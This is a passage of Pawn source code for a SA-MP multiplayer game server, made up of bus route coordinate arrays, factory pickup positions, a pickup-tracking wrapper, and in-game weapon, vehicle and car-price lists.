	{-2736.0510,1076.3564,46.6157, -2753.1973,989.3776,54.0414},
	{-2753.1973,989.3776,54.0414, -2752.8333,889.3956,65.9159},
	{-2752.8333,889.3956,65.9159, -2753.9016,769.2898,53.9614},
	{-2753.9016,769.2898,53.9614, -2753.8579,704.6906,40.8521}, ////////////////
	{-2753.8579,704.6906,40.8521, -2752.6665,583.9778,15.5260},
	{-2752.6665,583.9778,15.5260, -2629.1440,559.9763,14.1880},
	{-2629.1440,559.9763,14.1880, -2609.3816,550.2076,14.1880}, //////////////////////////
	{-2609.3816,550.2076,14.1880, -2609.2786,419.0351,14.1443},
	{-2609.2786,419.0351,14.1443, -2623.4963,332.2929,3.9100},
	{-2623.4963,332.2929,3.9100, -2694.1890,337.3127,3.9130},
	{-2694.1890,337.3127,3.9130, -2709.2107,310.5451,3.9068},
	{-2709.2107,310.5451,3.9068, -2708.7454,265.6249,3.9068}, ////////////////////////
	{-2708.7454,265.6249,3.9068, -2708.4983,137.9188,3.9068},
	{-2708.4983,137.9188,3.9068, -2708.3228,61.5767,3.9068},
	{-2708.3228,61.5767,3.9068, -2708.6318,5.2428,3.9068},
	{-2708.6318,5.2428,3.9068, -2708.3984,-57.2606,3.9068},
	{-2708.3984,-57.2606,3.9068, -2676.2898,-72.9829,3.9068},
	{-2676.2898,-72.9829,3.9068, -2588.9204,-72.8143,3.9952}, /////////////////////
	{-2588.9204,-72.8143,3.9952, -2468.8010,-72.3784,30.7145},
	{-2468.8010,-72.3784,30.7145, -2389.8684,-72.2215,34.8912},
	{-2389.8684,-72.2215,34.8912, -2298.3589,-72.0373,34.8912},
	{-2298.3589,-72.0373,34.8912, -2199.7261,-72.9877,34.8990},
	{-2199.7261,-72.9877,34.8990, -2097.7122,-73.0991,34.8989},
	{-2097.7122,-73.0991,34.8989, -2027.6685,-73.1562,34.8990},
	{-2027.6685,-73.1562,34.8990, -2004.3160,-47.7378,34.8920}, /////////////////
	{-2004.3160,-47.7378,34.8920, -2003.9662,82.7331,27.2662},
	{-2003.9662,82.7331,27.2662, -1988.0446,140.1014,27.2661},
	{-1988.0446,140.1014,27.2661, 0.0, 0.0, 0.0}
};
//==============================================================================
new Float:BusCityLS[][] = {
	{1810.4319,-1889.4810,13.1383, 1818.0439,-1906.7059,13.1226},
	{1818.0439,-1906.7059,13.1226, 1843.1340,-1935.2397,13.1073},
	{1843.1340,-1935.2397,13.1073, 1946.9880,-1935.2286,13.1099},
	{1946.9880,-1935.2286,13.1099, 1959.2635,-1961.4700,13.4311},
	{1959.2635,-1961.4700,13.4311, 1959.2693,-2069.4841,13.1099},
	{1959.2693,-2069.4841,13.1099, 1987.7285,-2111.8867,13.0709},
	{1987.7285,-2111.8867,13.0709, 2105.4421,-2113.4316,13.0344},
	{2105.4421,-2113.4316,13.0344, 2183.5554,-2154.2122,13.1079},
	{2183.5554,-2154.2122,13.1079, 2223.1812,-2144.0498,13.0937},
	{2223.1812,-2144.0498,13.0937, 2298.0415,-2070.1282,13.0763},
	{2298.0415,-2070.1282,13.0763, 2447.1260,-2051.2375,23.3311},
	{2447.1260,-2051.2375,23.3311, 2688.4075,-2051.2974,13.4521},
	{2688.4075,-2051.2974,13.4521, 2717.2813,-2018.4767,13.0423},
	{2717.2813,-2018.4767,13.0423, 2716.9824,-1948.2344,13.0462}, ///////////
	{2716.9824,-1948.2344,13.0462, 2684.5635,-1930.2468,13.0349},
	{2684.5635,-1930.2468,13.0349, 2533.5410,-1930.1655,13.1099},
	{2533.5410,-1930.1655,13.1099, 2518.7649,-1905.3146,13.1099},
	{2518.7649,-1905.3146,13.1099, 2530.4792,-1746.5675,13.1099},
	{2530.4792,-1746.5675,13.1099, 2507.3545,-1729.7444,13.1099},
	{2507.3545,-1729.7444,13.1099, 2458.1924,-1729.8230,13.1669},
	{2458.1924,-1729.8230,13.1669, 2370.1084,-1729.0712,13.1099}, //////////
	{2370.1084,-1729.0712,13.1099, 2344.9167,-1700.7648,13.0865},
	{2344.9167,-1700.7648,13.0865, 2344.4531,-1635.1097,15.7140},
	{2344.4531,-1635.1097,15.7140, 2344.3831,-1537.1405,23.5631},
	{2344.3831,-1537.1405,23.5631, 2345.2053,-1401.7501,23.5419},
	{2345.2053,-1401.7501,23.5419, 2345.2053,-1401.7501,23.5419}, ////////////
	{2345.2053,-1401.7501,23.5419, 2306.3291,-1355.6639,23.5833},
	{2306.3291,-1355.6639,23.5833, 2306.0701,-1263.0122,23.5694},
	{2306.0701,-1263.0122,23.5694, 2306.0544,-1166.9471,26.2076},
	{2306.0544,-1166.9471,26.2076, 2278.0364,-1145.3464,26.4622},
	{2278.0364,-1145.3464,26.4622, 2170.0706,-1101.1121,25.1248},
	{2170.0706,-1101.1121,25.1248, 2098.8899,-1059.0880,27.2549}, ////////////////
	{2098.8899,-1059.0880,27.2549, 1975.3855,-1024.3198,33.9819},
	{1975.3855,-1024.3198,33.9819, 1835.6329,-1008.1421,35.8599},
	{1835.6329,-1008.1421,35.8599, 1650.2634,-974.2786,37.7485},
	{1650.2634,-974.2786,37.7485, 1462.4369,-950.4426,35.8566},
	{1462.4369,-950.4426,35.8566, 1273.5957,-921.0332,41.7579},
	{1273.5957,-921.0332,41.7579, 1143.7179,-941.1769,42.4873}, ///////////////////
	{1143.7179,-941.1769,42.4873, 1008.0687,-954.9758,41.5459},
	{1008.0687,-954.9758,41.5459, 894.7026,-977.7119,37.0105},
	{894.7026,-977.7119,37.0105, 795.0063,-1117.0616,23.3981},
	{795.0063,-1117.0616,23.3981, 794.2153,-1301.7091,13.1099},
	{794.2153,-1301.7091,13.1099, 762.1239,-1317.6649,13.1177},
	{762.1239,-1317.6649,13.1177, 650.9243,-1317.1066,13.0927},
	{650.9243,-1317.1066,13.0927, 624.3660,-1343.6879,13.1109},
	{624.3660,-1343.6879,13.1109, 678.2251,-1408.0879,13.1410}, ////////////////// два выше
	{678.2251,-1408.0879,13.1410, 848.8802,-1407.2465,12.9748},
	{848.8802,-1407.2465,12.9748, 974.1296,-1408.0800,12.8539},
	{974.1296,-1408.0800,12.8539, 1047.2054,-1407.8768,13.0464},
	{1047.2054,-1407.8768,13.0464, 1054.4144,-1470.0935,13.1025},
	{1054.4144,-1470.0935,13.1025, 1035.5215,-1614.6154,13.1099},
	{1035.5215,-1614.6154,13.1099, 1035.2695,-1701.0004,13.1142},
	{1035.2695,-1701.0004,13.1142, 1078.9595,-1714.1427,13.1099},
	{1078.9595,-1714.1427,13.1099, 1160.0457,-1714.3573,13.5051},
	{1160.0457,-1714.3573,13.5051, 1171.8032,-1761.6724,13.1255},
	{1171.8032,-1761.6724,13.1255, 1172.3824,-1838.3466,13.1315}, ////////////////////////
	{1211.1880,-1854.7206,13.1099, 1392.6388,-1875.1660,13.1099},
	{1392.6388,-1875.1660,13.1099, 1482.8757,-1874.8218,13.1099},
	{1482.8757,-1874.8218,13.1099,1556.2026,-1874.5105,13.1099},
	{1556.2026,-1874.5105,13.1099, 1572.3474,-1844.3711,13.1099},
	{1572.7369,-1746.3386,13.1099, 1544.3866,-1729.6533,13.1099},
	{1544.3866,-1729.6533,13.1099, 1532.4961,-1701.3772,13.1099},
	{1532.4961,-1701.3772,13.1099, 1534.9849,-1669.5476,13.1099},
	{1534.9849,-1669.5476,13.1099, 1532.5854,-1607.5736,13.1099}, ///////////////////
	{1532.5854,-1607.5736,13.1099, 1572.1364,-1594.9028,13.1099},
	{1572.1364,-1594.9028,13.1099, 1656.8585,-1594.5774,13.1210},
	{1656.8585,-1594.5774,13.1210, 1806.9504,-1613.6790,13.082},
	{1806.9504,-1613.6790,13.082, 1819.3682,-1649.8215,13.1099},
	{1819.3682,-1649.8215,13.1099, 1818.8715,-1788.1320,13.1099},
	{1818.8715,-1788.1320,13.1099, 1790.2782,-1905.7708,13.5294},
	{1790.2782,-1905.7708,13.5294, 0.0, 0.0, 0.0}
};
//==============================================================================
new Float:BusSchool[][] = {
	{1811.1938,-1889.8872,13.5440, 1824.2263,-1860.5249,13.5438},
	{1824.2263,-1860.5249,13.5438, 1805.1449,-1829.8010,13.5239},
	{1805.1449,-1829.8010,13.5239, 1707.6541,-1809.7888,13.4965},
	{1707.6541,-1809.7888,13.4965, 1686.9036,-1836.6459,13.5159},
	{1686.9036,-1836.6459,13.5159, 1651.8804,-1869.6266,13.5162},
	{1651.8804,-1869.6266,13.5162, 1502.8373,-1869.8811,13.5162},
	{1502.8373,-1869.8811,13.5162, 1353.4274,-1860.7042,13.5161},
	{1353.4274,-1860.7042,13.5161, 1199.3623,-1849.8413,13.5264},
	{1199.3623,-1849.8413,13.5264, 1182.1199,-1834.6306,13.5401},
	{1182.1199,-1834.6306,13.5401, 1182.1145,-1758.0706,13.5318},
	{1182.1145,-1758.0706,13.5318, 1182.0609,-1730.1096,13.5597},
	{1182.0609,-1730.1096,13.5597, 1158.7635,-1709.4669,13.8951}, /////////////////////
	{1158.7635,-1709.4669,13.8951, 1055.4957,-1709.8052,13.5161},
	{1055.4957,-1709.8052,13.5161, 1040.0447,-1687.1139,13.5148},
	{1040.0447,-1687.1139,13.5148, 1045.7626,-1522.2072,13.5117},
	{1045.7626,-1522.2072,13.5117, 1064.9896,-1424.6063,13.5307},
	{1064.9896,-1424.6063,13.5307, 1038.4175,-1397.8860,13.4361},
	{1038.4175,-1397.8860,13.4361, 907.1119,-1398.2129,13.3256},
	{907.1119,-1398.2129,13.3256, 785.7393,-1398.1437,13.5111},
	{785.7393,-1398.1437,13.5111, 635.0753,-1377.9424,13.6560},
	{635.0753,-1377.9424,13.6560, 631.3265,-1234.9570,17.9523},
	{631.3265,-1234.9570,17.9523, 595.9270,-1214.4860,18.0844},
	{595.9270,-1214.4860,18.0844, 533.9899,-1244.2378,16.6246},
	{533.9899,-1244.2378,16.6246, 439.1609,-1317.1486,15.1071}, ////////////////////
	{439.1609,-1317.1486,15.1071, 277.6425,-1408.1100,13.8231},
	{277.6425,-1408.1100,13.8231, 155.9912,-1540.8994,11.0707},
	{155.9912,-1540.8994,11.0707, 133.4830,-1543.3573,8.9214},
	{133.4830,-1543.3573,8.9214, 48.5961,-1524.0131,5.2265},
	{48.5961,-1524.0131,5.2265, -100.3352,-1488.1211,2.8273},
	{-100.3352,-1488.1211,2.8273, -145.1024,-1306.7865,2.8257},
	{-145.1024,-1306.7865,2.8257, -78.1516,-1082.8153,9.7584},
	{-78.1516,-1082.8153,9.7584, -145.0393,-965.2789,27.8099},
	{-145.0393,-965.2789,27.8099, -283.7025,-876.4399,46.2992},
	{-283.7025,-876.4399,46.2992, -290.2096,-862.1980,46.6386},
	{-290.2096,-862.1980,46.6386, -337.2691,-781.2326,32.0309},
	{-337.2691,-781.2326,32.0309, -351.1661,-756.6705,29.3102},
	{-351.1661,-756.6705,29.3102, -419.3888,-610.9619,10.0949},
	{-419.3888,-610.9619,10.0949, -401.9373,-484.5970,19.1983},
	{-401.9373,-484.5970,19.1983, -535.3818,-389.8976,18.6940},
	{-535.3818,-389.8976,18.6940, -714.6323,-421.5444,16.5601},
	{-714.6323,-421.5444,16.5601, -897.4656,-455.0970,25.314},
	{-897.4656,-455.0970,25.3148, -1032.5560,-445.4271,36.2358},
	{-1032.5560,-445.4271,36.2358, -1154.7145,-585.3818,33.6438},
	{-1154.7145,-585.3818,33.6438, -1216.5745,-752.1287,62.2464},
	{-1216.5745,-752.1287,62.2464, -1351.1592,-811.6833,77.7376},
	{-1351.1592,-811.6833,77.7376, -1522.3048,-813.4449,57.6774},
	{-1522.3048,-813.4449,57.6774, -1723.8932,-734.2736,34.8972},
	{-1723.8932,-734.2736,34.8972, -1758.8379,-603.1448,16.3447},
	{-1758.8379,-603.1448,16.3447, -1783.2706,-575.9223,16.4678},
	{-1783.2706,-575.9223,16.4678, -1899.6965,-575.5848,24.6116},
	{-1899.6965,-575.5848,24.6116, -2051.6191,-571.2690,29.2605},
	{-2051.6191,-571.2690,29.2605, -2187.7424,-455.8456,49.5788},
	{-2187.7424,-455.8456,49.5788, -2251.7327,-328.5629,51.0000},
	{-2251.7327,-328.5629,51.0000, -2251.2747,-91.2423,35.3053},
	{-2251.2747,-91.2423,35.3053, -2232.7847,-73.0775,35.3043},
	{-2232.7847,-73.0775,35.3043, -2092.6924,-72.8101,35.3056},
	{-2092.6924,-72.8101,35.3056, -2027.0743,-72.7576,35.3048},
	{-2027.0743,-72.7576,35.3048, -1970.9655,-67.5993,26.9884},
	{-1970.9655,-67.5993,26.9884, -1890.0920,-108.0391,16.7302}, ///////////////
	{-1890.0920,-108.0391,16.7302, -1817.6470,-118.8596,5.6305},
	{-1817.6470,-118.8596,5.6305, -1801.6559,-133.2738,5.9989},
	{-1801.6559,-133.2738,5.9989, -1801.5969,-259.9263,19.6941},
	{-1801.5969,-259.9263,19.6941, -1819.6621,-422.3518,15.2981},
	{-1819.6621,-422.3518,15.2981, -1821.7964,-556.8774,16.2816},
	{-1821.7964,-556.8774,16.2816, -1786.8654,-584.6452,16.4567},
	{-1786.8654,-584.6452,16.4567, -1764.6979,-603.6809,16.3423},
	{-1764.6979,-603.6809,16.3423, -1748.6947,-720.4413,30.5434},
	{-1748.6947,-720.4413,30.5434, -1581.0503,-807.4423,50.3464},
	{-1581.0503,-807.4423,50.3464, -1423.3228,-821.4654,79.8878},
	{-1423.3228,-821.4654,79.8878, -1224.8724,-769.6058,64.0403},
	{-1224.8724,-769.6058,64.0403, -1152.8224,-596.8960,35.3450},
	{-1152.8224,-596.8960,35.3450, -1041.1260,-457.2589,35.9495},
	{-1041.1260,-457.2589,35.9495, -913.1431,-459.6167,27.2702},
	{-913.1431,-459.6167,27.2702, -723.4605,-431.7139,16.2679},
	{-723.4605,-431.7139,16.2679, -499.9919,-400.8935,15.5326},
	{-499.9919,-400.8935,15.5326, -402.3564,-536.7015,17.7195},
	{-402.3564,-536.7015,17.7195, -378.8124,-714.2237,23.0889},
	{-378.8124,-714.2237,23.0889, -328.8730,-789.6298,33.0501},
	{-328.8730,-789.6298,33.0501, -295.5281,-858.0462,46.4355},
	{-295.5281,-858.0462,46.4355, -268.9687,-889.9434,45.3004},
	{-268.9687,-889.9434,45.3004, -140.8723,-976.6584,26.5499},
	{-140.8723,-976.6584,26.5499, -94.1295,-1115.8562,1.4520},
	{-94.1295,-1115.8562,1.4520, -151.3767,-1304.5347,2.8290},
	{-151.3767,-1304.5347,2.8290, -92.9396,-1501.0825,2.8312},
	{-92.9396,-1501.0825,2.8312, 159.4090,-1553.2952,11.3128},
	{159.4090,-1553.2952,11.3128, 252.4596,-1434.1473,13.5760},
	{252.4596,-1434.1473,13.5760, 459.7539,-1317.6747,15.3072},
	{459.7539,-1317.6747,15.3072, 565.3486,-1243.3866,17.3311},
	{565.3486,-1243.3866,17.3311, 605.5002,-1226.4463,18.1500}, //////////////////
	{605.5002,-1226.4463,18.1500, 625.8234,-1253.1117,17.6397},
	{625.8234,-1253.1117,17.6397, 627.3690,-1377.5931,13.6519},
	{627.3690,-1377.5931,13.6519, 660.7958,-1404.8990,13.5326},
	{660.7958,-1404.8990,13.5326, 806.2908,-1405.2435,13.4385},
	{806.2908,-1405.2435,13.4385, 1018.8021,-1405.9326,13.1585},
	{1018.8021,-1405.9326,13.1585, 1059.8605,-1423.7445,13.5040},
	{1059.8605,-1423.7445,13.5040, 1035.2980,-1569.7013,13.5185},
	{1035.2980,-1569.7013,13.5185, 1034.6521,-1697.4269,13.5162},
	{1034.6521,-1697.4269,13.5162, 1055.5187,-1714.7716,13.5160},
	{1055.5187,-1714.7716,13.5160, 1157.6907,-1714.5591,13.9120},
	{1157.6907,-1714.5591,13.9120, 1172.8723,-1727.8831,13.7010},
	{1172.8723,-1727.8831,13.7010, 1172.4209,-1764.7063,13.5319},
	{1172.4209,-1764.7063,13.5319, 1172.8641,-1834.6772,13.5380}, ////////////
	{1172.8641,-1834.6772,13.5380, 1194.4520,-1854.6458,13.5317},
	{1194.4520,-1854.6458,13.5317, 1331.0106,-1856.5723,13.5174},
	{1331.0106,-1856.5723,13.5174, 1462.7120,-1875.5095,13.5180},
	{1462.7120,-1875.5095,13.5180, 1656.1395,-1874.7982,13.5168},
	{1656.1395,-1874.7982,13.5168, 1692.3484,-1833.1428,13.5170},
	{1692.3484,-1833.1428,13.5170, 1705.9072,-1815.0320,13.4979},
	{1705.9072,-1815.0320,13.4979, 1803.7441,-1834.7439,13.5176},
	{1803.7441,-1834.7439,13.5176, 1819.1780,-1864.0748,13.5492},
	{1819.1780,-1864.0748,13.5492, 1812.3113,-1888.3627,13.5433},
	{1812.3113,-1888.3627,13.5433, 1788.1925,-1905.1683,13.5291},
	{1788.1925,-1905.1683,13.5291, 0.0, 0.0, 0.0}
};
//==============================================================================
new farmpickup;
new Float:BusLS[][] = {
	{1808.7693,-1889.6619,13.5441, 1824.0190,-1874.4978,13.4840},
	{1824.0190,-1874.4978,13.4840, 1824.0060,-1773.2596,13.5162},
	{1824.0060,-1773.2596,13.5162, 1824.0614,-1635.0193,13.5162},
	{1824.0614,-1635.0193,13.5162, 1844.6427,-1520.9193,13.5105},
	{1844.6427,-1520.9193,13.5105, 1853.1488,-1389.1710,13.5240},
	{1853.1488,-1389.1710,13.5240, 1852.5815,-1201.0886,22.2652},
	{1852.5815,-1201.0886,22.2652, 1828.0586,-1178.4015,23.7647},
	{1828.0586,-1178.4015,23.7647, 1743.3359,-1159.2402,23.7648},
	{1743.3359,-1159.2402,23.7648, 1657.0310,-1158.5968,23.9014},
	{1657.0310,-1158.5968,23.9014, 1557.1129,-1158.6820,24.0388}, /////////////////
	{1557.1129,-1158.6820,24.0388, 1437.4683,-1158.1476,23.7897},
	{1437.4683,-1158.1476,23.7897, 1376.5890,-1138.8882,23.7887},
	{1376.5890,-1138.8882,23.7887, 1360.5190,-1121.9950,23.8286},
	{1360.5190,-1121.9950,23.8286, 1378.7158,-965.2871,33.8278},
	{1378.7158,-965.2871,33.8278, 1395.1383,-950.7330,34.7365},
	{1395.1383,-950.7330,34.7365, 1482.0538,-975.8360,36.9147},
	{1482.0538,-975.8360,36.9147, 1588.9043,-991.8221,47.5224},
	{1588.9043,-991.8221,47.5224, 1690.7782,-925.4719,52.2945},
	{1690.7782,-925.4719,52.2945, 1710.1456,-811.7196,56.6823},
	{1710.1456,-811.7196,56.6823, 1715.7312,-658.3969,42.8951},
	{1715.7312,-658.3969,42.8951, 1703.9282,-455.4938,33.5071},
	{1703.9282,-455.4938,33.5071, 1677.1586,-251.9822,43.3416},
	{1677.1586,-251.9822,43.3416, 1654.6398,-33.1713,36.6220},
	{1654.6398,-33.1713,36.6220, 1626.1002,136.1207,36.2453},
	{1626.1002,136.1207,36.2453, 1702.3450,390.6835,30.3718},
	{1702.3450,390.6835,30.3718, 1778.0345,612.6203,21.4697},
	{1778.0345,612.6203,21.4697, 1806.4822,812.1041,11.0276},
	{1806.4822,812.1041,11.0276, 1767.3173,852.2102,10.4838},
	{1767.3173,852.2102,10.4838, 1619.8535,852.7777,6.8647},
	{1619.8535,852.7777,6.8647, 1423.8711,863.6336,6.9534},
	{1423.8711,863.6336,6.9534, 1259.5035,935.0343,14.0343},
	{1259.5035,935.0343,14.0343, 1108.6045,837.5462,10.8190},
	{1108.6045,837.5462,10.8190, 951.2515,750.0100,10.8096},
	{951.2515,750.0100,10.8096, 780.5138,689.3925,11.4581},
	{780.5138,689.3925,11.4581, 559.9733,696.3895,3.4388},
	{559.9733,696.3895,3.4388, 367.5167,783.2415,6.5434},
	{367.5167,783.2415,6.5434, 272.1324,877.9490,21.3849},
	{272.1324,877.9490,21.3849, 235.9642,956.7602,28.0319},
	{235.9642,956.7602,28.0319, 244.9654,975.6467,28.3250},
	{244.9654,975.6467,28.3250, 397.9491,1016.9831,28.5701},
	{397.9491,1016.9831,28.5701, 564.1965,1060.3011,28.5695},
	{564.1965,1060.3011,28.5695, 718.3242,1101.9430,28.5811},
	{718.3242,1101.9430,28.5811, 802.7499,1132.6182,28.5613},
	{802.7499,1132.6182,28.5613, 832.3854,1119.7511,29.9747},
	{832.3854,1119.7511,29.9747, 914.5725,941.4826,13.3511},
	{914.5725,941.4826,13.3511, 832.3351,854.2448,12.4807},
	{832.3351,854.2448,12.4807, 890.7936,891.7736,13.4848}, //////////////////
	{890.7936,891.7736,13.4848, 887.9802,1028.9658,16.6697},
	{887.9802,1028.9658,16.6697, 827.2870,1127.1987,30.0681},
	{827.2870,1127.1987,30.0681, 797.9722,1136.6748,28.4726},
	{797.9722,1136.6748,28.4726, 622.5432,1083.0826,28.4664},
	{622.5432,1083.0826,28.4664, 430.2862,1031.9989,28.4727},
	{430.2862,1031.9989,28.4727, 239.7596,980.1387,28.3301},
	{239.7596,980.1387,28.3301, 229.4479,955.5310,28.0652},
	{229.4479,955.5310,28.0652, 299.3630,797.7305,14.8966},
	{299.3630,797.7305,14.8966, 426.2678,601.2230,19.0801},
	{426.2678,601.2230,19.0801, 512.9183,478.3800,19.0631},
	{512.9183,478.3800,19.0631, 615.2172,326.4894,19.7042},
	{615.2172,326.4894,19.7042, 605.2267,308.3843,19.6450},
	{605.2267,308.3843,19.6450, 522.1287,247.3229,14.6816},
	{522.1287,247.3229,14.6816, 511.1678,212.9783,14.1755},
	{511.1678,212.9783,14.1755, 524.8848,55.7221,20.7846},
	{524.8848,55.7221,20.7846, 525.1271,-117.4125,37.5993},
	{525.1271,-117.4125,37.5993, 543.7299,-144.9373,37.3545},
	{543.7299,-144.9373,37.3545, 742.2243,-164.6572,19.2261},
	{742.2243,-164.6572,19.2261, 937.1564,-180.5933,11.0567},
	{937.1564,-180.5933,11.0567, 1089.0780,-190.0154,40.2116},
	{1089.0780,-190.0154,40.2116, 1187.1486,-185.4979,39.7762},
	{1187.1486,-185.4979,39.7762, 1251.4387,-354.2089,4.3749},
	{1251.4387,-354.2089,4.3749, 1228.0728,-559.8834,42.2943},
	{1228.0728,-559.8834,42.2943, 1154.3828,-773.3051,58.0512},
	{1154.3828,-773.3051,58.0512, 1156.1265,-925.4431,43.0940},
	{1156.1265,-925.4431,43.0940, 1180.6953,-953.1128,42.7677},
	{1180.6953,-953.1128,42.7677, 1268.9562,-936.8261,42.3414},
	{1268.9562,-936.8261,42.3414, 1347.3760,-943.0712,34.9112},
	{1347.3760,-943.0712,34.9112, 1359.3085,-961.2700,33.8680},
	{1359.3085,-961.2700,33.8680, 1340.5586,-1122.0743,23.8279},
	{1340.5586,-1122.0743,23.8279, 1358.0342,-1143.0795,23.8027},
	{1358.0342,-1143.0795,23.8027, 1436.1731,-1162.8156,23.7961},
	{1436.1731,-1162.8156,23.7961, 1498.9742,-1163.6650,24.0570},
	{1498.9742,-1163.6650,24.0570, 1656.2780,-1163.5833,23.9116},
	{1656.2780,-1163.5833,23.9116, 1728.9275,-1163.5092,23.7771}, ///////////
	{1728.9275,-1163.5092,23.7771, 1828.8960,-1183.5767,23.7642},
	{1828.8960,-1183.5767,23.7642, 1845.8003,-1200.4696,22.3763},
	{1845.8003,-1200.4696,22.3763, 1846.0093,-1298.4708,13.5051},
	{1846.0093,-1298.4708,13.5051, 1846.3126,-1443.3279,13.5332},
	{1846.3126,-1443.3279,13.5332, 1819.3213,-1590.4891,13.4889},
	{1819.3213,-1590.4891,13.4889, 1819.3759,-1711.7463,13.5161},
	{1819.3759,-1711.7463,13.5161, 1819.2158,-1848.1592,13.5477},
	{1819.2158,-1848.1592,13.5477, 1811.9922,-1888.8358,13.5436},
	{1811.9922,-1888.8358,13.5436, 1788.8031,-1905.1083,13.5291},
	{1788.8031,-1905.1083,13.5291, 0.0, 0.0, 0.0}
};
new MatsFact[8];
new Float:MatsFactory[][3] = {
	{-86.2509,-299.3652,2.7646},
	{-116.7471,-313.0763,2.7646},
	{-130.5802,-313.0766,2.7646},
	{-144.4753,-313.0768,2.7646},
	{-154.4071,-289.4621,3.9053},
	{-107.5331,-219.7510,2.0464},
	{-60.5808,-224.0675,5.429},
	{-50.6185,-233.6626,6.7646}
};
enum PickInfo{
Float: PickX,
Float: PickY,
Float: PickZ}
new PickupInfo[MAX_PICKUPS][PickInfo];
CreatePickupAC(model, type, Float:X, Float:Y, Float:Z, virtualworld = 0)
{
	new TempID = CreatePickup(model, type, X, Y, Z, virtualworld);
	PickupInfo[TempID][PickX] = X;
	PickupInfo[TempID][PickY] = Y;
	PickupInfo[TempID][PickZ] = Z;
	return TempID;
}
#define CreatePickup CreatePickupAC
new WeaponNames[][32] = {
	{"Unarmed (Fist)"}, // 0
	{"Brass Knuckles"}, // 1
	{"Golf Club"}, // 2
	{"Night Stick"}, // 3
	{"Knife"}, // 4
	{"Baseball Bat"}, // 5
	{"Shovel"}, // 6
	{"Pool Cue"}, // 7
	{"Katana"}, // 8
	{"Chainsaw"}, // 9
	{"Purple Dildo"}, // 10
	{"Big White Vibrator"}, // 11
	{"Medium White Vibrator"}, // 12
	{"Small White Vibrator"}, // 13
	{"Flowers"}, // 14
	{"Cane"}, // 15
	{"Grenade"}, // 16
	{"Teargas"}, // 17
	{"Molotov"}, // 18
	{" "}, // 19
	{" "}, // 20
	{" "}, // 21
	{"Colt 45"}, // 22
	{"Colt 45 (Silenced)"}, // 23
	{"Desert Eagle"}, // 24
	{"Normal Shotgun"}, // 25
	{"Sawnoff Shotgun"}, // 26
	{"Combat Shotgun"}, // 27
	{"Micro Uzi (Mac 10)"}, // 28
	{"MP5"}, // 29
	{"AK47"}, // 30
	{"M4"}, // 31
	{"Tec9"}, // 32
	{"Country Rifle"}, // 33
	{"Sniper Rifle"}, // 34
	{"Rocket Launcher"}, // 35
	{"Heat-Seeking Rocket Launcher"}, // 36
	{"Flamethrower"}, // 37
	{"Minigun"}, // 38
	{"Satchel Charge"}, // 39
	{"Detonator"}, // 40
	{"Spray Can"}, // 41
	{"Fire Extinguisher"}, // 42
	{"Camera"}, // 43
	{"Night Vision Goggles"}, // 44
	{"Infrared Vision Goggles"}, // 45
	{"Parachute"}, // 46
	{"Fake Pistol"} // 47
};
new RobMatsPickup;
new RobZavodPickup;
new bool:PlayerTied[MAX_PLAYERS];
new VehicleNameS[][] = {
	"Landstalker",
	"Bravura",
	"Buffalo",
	"Linerunner",
	"Pereniel",
	"Sentinel",
	"Dumper",
	"Firetruck",
	"Trashmaster",
	"Stretch",
	"Manana",
	"Infernus",
	"Voodoo",
	"Pony",
	"Mule",
	"Cheetah",
	"Ambulance",
	"Leviathan",
	"Moonbeam",
	"Esperanto",
	"Taxi",
	"Washington",
	"Bobcat",
	"Mr Whoopee",
	"BF Injection",
	"Hunter",
	"Premier",
	"Enforcer",
	"Securicar",
	"Banshee",
	"Predator",
	"Bus",
	"Rhino",
	"Barracks",
	"Hotknife",
	"Trailer",
	"Previon",
	"Coach",
	"Cabbie",
	"Stallion",
	"Rumpo",
	"RC Bandit",
	"Romero",
	"Packer",
	"Monster Truck",
	"Admiral",
	"Squalo",
	"Seasparrow",
	"Pizzaboy",
	"Tram",
	"Trailer",
	"Turismo",
	"Speeder",
	"Reefer",
	"Tropic",
	"Flatbed",
	"Yankee",
	"Caddy",
	"Solair",
	"Berkley's RC Van",
	"Skimmer",
	"PCJ-600",
	"Faggio",
	"Freeway",
	"RC Baron",
	"RC Raider",
	"Glendale",
	"Oceanic",
	"Sanchez",
	"Sparrow",
	"Patriot",
	"Quad",
	"Coastguard",
	"Dinghy",
	"Hermes",
	"Sabre",
	"Rustler",
	"ZR-350",
	"Walton",
	"Regina",
	"Comet",
	"BMX",
	"Burrito",
	"Camper",
	"Marquis",
	"Baggage",
	"Dozer",
	"Maverick",
	"News Chopper",
	"Rancher",
	"FBI Rancher",
	"Virgo",
	"Greenwood",
	"Jetmax",
	"Hotring",
	"Sandking",
	"Blista Compact",
	"Police Maverick",
	"Boxville",
	"Benson",
	"Mesa",
	"RC Goblin",
	"Hotring Racer",
	"Hotring Racer",
	"Bloodring Banger",
	"Rancher",
	"Super GT",
	"Elegant",
	"Journey",
	"Bike",
	"Mountain Bike",
	"Beagle",
	"Cropdust",
	"Stunt",
	"Tanker",
	"RoadTrain",
	"Nebula",
	"Majestic",
	"Buccaneer",
	"Shamal",
	"Hydra",
	"FCR-900",
	"NRG-500",
	"HPV1000",
	"Cement Truck",
	"Tow Truck",
	"Fortune",
	"Cadrona",
	"FBI Truck",
	"Willard",
	"Forklift",
	"Tractor",
	"Combine",
	"Feltzer",
	"Remington",
	"Slamvan",
	"Blade",
	"Freight",
	"Streak",
	"Vortex",
	"Vincent",
	"Bullet",
	"Clover",
	"Sadler",
	"Firetruck",
	"Hustler",
	"Intruder",
	"Primo",
	"Cargobob",
	"Tampa",
	"Sunrise",
	"Merit",
	"Utility",
	"Nevada",
	"Yosemite",
	"Windsor",
	"Monster Truck",
	"Monster Truck",
	"Uranus",
	"Jester",
	"Sultan",
	"Stratum",
	"Elegy",
	"Raindance",
	"RC Tiger",
	"Flash",
	"Tahoma",
	"Savanna",
	"Bandito",
	"Freight",
	"Trailer",
	"Kart",
	"Mower",
	"Duneride",
	"Sweeper",
	"Broadway",
	"Tornado",
	"AT-400",
	"DFT-30",
	"Huntley",
	"Stafford",
	"BF-400",
	"Newsvan",
	"Tug",
	"Trailer",
	"Emperor",
	"Wayfarer",
	"Euros",
	"Hotdog",
	"Club",
	"Trailer",
	"Trailer",
	"Andromada",
	"Dodo",
	"RC Cam",
	"Launch",
	"Police (LSPD)",
	"Police (SFPD)",
	"Police (LVPD)",
	"Police Ranger",
	"Picador",
	"S.W.A.T. Van",
	"Alpha",
	"Phoenix",
	"Glendale",
	"Sadler",
	"Luggage Trailer",
	"Luggage Trailer",
	"Stair Trailer",
	"Boxville",
	"Farm Plow",
	"Utility Trailer"
};
new carsA[16][2]={
	{402,3100000},
	{411,4100000},
	{415,3400000},
	{429,3250000},
	{451,4500000},
